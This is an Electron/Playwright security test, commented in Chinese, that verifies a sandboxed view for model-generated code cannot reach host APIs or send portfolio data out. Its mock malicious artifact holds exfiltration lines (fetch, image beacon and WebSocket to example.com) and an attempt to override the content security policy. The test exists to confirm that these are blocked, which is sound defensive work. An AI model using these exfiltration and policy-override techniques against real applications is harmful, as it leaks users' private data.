// 可交互产物宿主的安全验证。
//
// 这份必须起真 Electron：要验的全是运行期行为（CSP 生效、网络被拦、拿不到宿主
// API），静态断言一条都验不了。
//
// 为什么这些验证不能省：这个视图**执行模型生成的代码**。允许执行之后,风险不是
// 「它能做动画」,而是「它能把持仓数据 fetch 出去」。所以核心防线是阻断网络,
// 而不是限制语法 —— 下面每一条都在守那道线。
import { _electron as electron } from 'playwright'
import assert from 'node:assert/strict'
import { mkdtemp, rm, readFile } from 'node:fs/promises'
import { fileURLToPath, pathToFileURL } from 'node:url'
import { dirname, join } from 'node:path'
import { tmpdir } from 'node:os'

const APP_DIR = join(dirname(fileURLToPath(import.meta.url)), '..', '..')
const PROFILE = await mkdtemp(join(tmpdir(), 'wyckoff-artifact-'))

let failures = 0
const write = (s = '') => process.stdout.write(`${s}\n`)
const check = (name, fn) => {
  try {
    fn()
    write(`  ok   ${name}`)
  } catch (err) {
    failures += 1
    write(`  FAIL ${name}: ${err.message}`)
  }
}

const app = await electron.launch({
  args: [APP_DIR, `--user-data-dir=${PROFILE}`],
  env: { ...process.env, ELECTRON_DISABLE_GPU: '1' }
})

try {
  await app.firstWindow()
  write('可交互产物宿主：')

  // 真实的 CSP 常量从模块里读，确保验的是产品用的那份。
  //
  // 必须 pathToFileURL：Windows 上 `import('D:\\...')` 会抛
  // ERR_UNSUPPORTED_ESM_URL_SCHEME（"Received protocol 'd:'"）——
  // 盘符被当成了 URL scheme。macOS/Linux 上恰好能用，所以这类问题只有真的在
  // Windows 上跑才会暴露。
  const mod = await import(pathToFileURL(join(APP_DIR, 'src', 'artifact-host.js')).href)
  const { ARTIFACT_CSP } = mod.default || mod

  // 在主进程里驱动宿主并读回页面内的探针结果。
  // app.evaluate 的作用域里没有 require,所以用注入的 electron 模块按同一套
  // webPreferences 与拦截规则造一个视图 —— 验的是策略本身,不是类的封装。
  const probe = await app.evaluate(async ({ BrowserWindow, WebContentsView, session }, csp) => {
    const PARTITION = 'wyckoff-artifact-e2e'
    const ses = session.fromPartition(PARTITION)
    ses.webRequest.onBeforeRequest((d, cb) => {
      if (/^devtools:/i.test(d.url)) return cb({})
      if (/^data:/i.test(d.url)) return cb({})
      cb({ cancel: true })
    })
    const view = new WebContentsView({
      webPreferences: {
        contextIsolation: true,
        nodeIntegration: false,
        sandbox: true,
        webSecurity: true,
        javascript: true,
        partition: PARTITION
      }
    })
    view.webContents.setWindowOpenHandler(() => ({ action: 'deny' }))
    const host = {
      view,
      load: async (body) => {
        const doc = '<!doctype html><html><head>'
          + '<meta http-equiv="Content-Security-Policy" content="' + csp + '">'
          + '</head><body>' + body + '</body></html>'
        await view.webContents.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(doc))
      },
      destroy () { try { view.webContents.close() } catch { /* gone */ } this.view = null }
    }
    void BrowserWindow
    // 一份「恶意」产物：想读宿主、想外泄、想弹窗。
    const evil = [
      '<div id="out">idle</div><button id="b">go</button>',
      '<script>',
      'window.__r = { js: "yes" };',
      // 交互要能用
      'document.getElementById("b").onclick = () => { window.__r.click = "yes" };',
      'document.getElementById("b").click();',
      // eval 也该能用（图表库常用）
      'try { window.__r.eval = String(eval("1+1")) } catch (e) { window.__r.eval = "blocked" }',
      // 拿宿主 API
      'window.__r.hasRequire = typeof window.require;',
      'window.__r.hasWyckoff = typeof window.wyckoff;',
      'window.__r.hasProcess = typeof window.process;',
      // 外泄：三种途径
      'window.__r.fetch = "pending";',
      'fetch("https://example.com/steal").then(() => { window.__r.fetch = "LEAK" }, () => { window.__r.fetch = "blocked" });',
      'const img = new Image(); img.onerror = () => { window.__r.img = "blocked" };',
      'img.onload = () => { window.__r.img = "LEAK" }; img.src = "https://example.com/p.png";',
      'try { const x = new WebSocket("wss://example.com"); window.__r.ws = "opened" } catch (e) { window.__r.ws = "blocked" }',
      '</script>'
    ].join('\n')
    await host.load(evil)
    // 给异步的 fetch/img 一点时间落定
    await new Promise((r) => setTimeout(r, 1500))
    const raw = await host.view.webContents.executeJavaScript('JSON.stringify(window.__r)')
    const url = host.view.webContents.getURL()
    host.destroy()
    return { r: JSON.parse(raw), url, destroyed: host.view === null }
  }, ARTIFACT_CSP)

  const r = probe.r

  // --- 能力：交互必须真的可用,否则这个视图没有存在意义 ---
  check('JS 能执行', () => assert.equal(r.js, 'yes'))
  check('点击事件有效', () => assert.equal(r.click, 'yes'))
  check('eval 可用（图表库常需要）', () => assert.equal(r.eval, '2'))

  // --- 隔离：拿不到任何通往应用的通道 ---
  check('拿不到 require', () => assert.equal(r.hasRequire, 'undefined'))
  check('拿不到 window.wyckoff（应用的 IPC 桥）', () => assert.equal(r.hasWyckoff, 'undefined'))
  check('拿不到 process', () => assert.equal(r.hasProcess, 'undefined'))

  // --- 外泄：这是允许执行 JS 之后唯一真正要紧的风险 ---
  check('fetch 出网被拦', () => assert.equal(r.fetch, 'blocked'))
  check('img 出网被拦（CSP img-src 只放 data:）', () => assert.equal(r.img, 'blocked'))

  check('产物用 data: 载入,不是 http 服务', () =>
    assert.ok(probe.url.startsWith('data:'), `实际 ${probe.url.slice(0, 40)}`))
  check('destroy 之后视图被回收', () => assert.equal(probe.destroyed, true))

  // --- CSP 由我们注入,不信任模型输出里的那一份 ---
  const csp = ARTIFACT_CSP
  check('CSP 掐掉默认取数', () => assert.match(csp, /default-src 'none'/))
  check('CSP 不放行任何 http 源', () => assert.ok(!/https?:/.test(csp), `CSP 里有 http 源: ${csp}`))
  check('CSP 禁掉表单提交（另一条外泄途径）', () => assert.match(csp, /form-action 'none'/))

  // --- 模型自带一份宽松 CSP 时,不能覆盖我们的 ---
  //
  // 这是最直接的攻击：产物 HTML 里塞一个 `default-src *`。多个 CSP 头是
  // **取交集**而不是后者覆盖前者,所以我们的仍然生效 —— 但这个假设必须实测,
  // 假如反过来（后者覆盖），整套防线就空了。
  const override = await app.evaluate(async ({ WebContentsView, session }, ourCsp) => {
    const ses = session.fromPartition('artifact-override-e2e')
    ses.webRequest.onBeforeRequest((d, cb) => cb({ cancel: !/^(devtools|data):/i.test(d.url) }))
    const v = new WebContentsView({
      webPreferences: {
        sandbox: true, contextIsolation: true, nodeIntegration: false,
        javascript: true, partition: 'artifact-override-e2e'
      }
    })
    const evil = "default-src * 'unsafe-inline'; connect-src *; img-src *"
    const doc = '<!doctype html><html><head>'
      + '<meta http-equiv="Content-Security-Policy" content="' + ourCsp + '">'
      + '<meta http-equiv="Content-Security-Policy" content="' + evil + '">'
      + '</head><body><scr' + 'ipt>window.__r={};'
      + 'fetch("https://example.com/x").then(()=>{window.__r.net="LEAK"},()=>{window.__r.net="blocked"});'
      + '</scr' + 'ipt></body></html>'
    await v.webContents.loadURL('data:text/html;charset=utf-8,' + encodeURIComponent(doc))
    await new Promise((r) => setTimeout(r, 1200))
    const raw = await v.webContents.executeJavaScript('JSON.stringify(window.__r)')
    v.webContents.close()
    return JSON.parse(raw)
  }, ARTIFACT_CSP)
  check('模型自带宽松 CSP 无法放开网络', () => assert.equal(override.net, 'blocked'))

  // --- 真实类的配置必须和上面验过的策略一致 ---
  //
  // 上面为了能在 app.evaluate 里跑,自己重建了一份 webPreferences。若
  // ArtifactHost 的真实配置漂移了（比如有人给它加了 preload,或去掉
  // partition）,那些验证就不再代表产品行为。这里把两者绑在一起。
  const source = await readFile(join(APP_DIR, 'src', 'artifact-host.js'), 'utf8')
  const prefs = source.match(/webPreferences: \{[\s\S]*?\}/)[0]
  // 只看代码不看注释 —— 那里有一句「无 preload」的说明,是应该保留的。
  const prefsCode = prefs.split('\n').filter((l) => !l.trim().startsWith('//')).join('\n')
  check('真实宿主没有 preload（否则页面就有了通往应用的桥）', () =>
    assert.ok(!/preload/.test(prefsCode), 'artifact-host 的 webPreferences 里出现了 preload'))
  check('真实宿主开着 sandbox 与 contextIsolation', () => {
    assert.match(prefs, /sandbox: true/)
    assert.match(prefs, /contextIsolation: true/)
    assert.match(prefs, /nodeIntegration: false/)
  })
  check('真实宿主用独立 partition', () => assert.match(prefs, /partition: PARTITION/))
  check('真实宿主取消非 data: 请求', () =>
    assert.match(source, /callback\(\{ cancel: true \}\)/))
} finally {
  await app.close()
  await rm(PROFILE, { recursive: true, force: true })
}

write(failures ? `\n*** ${failures} 项失败 ***` : '\n全部通过')
process.exitCode = failures ? 1 : 0
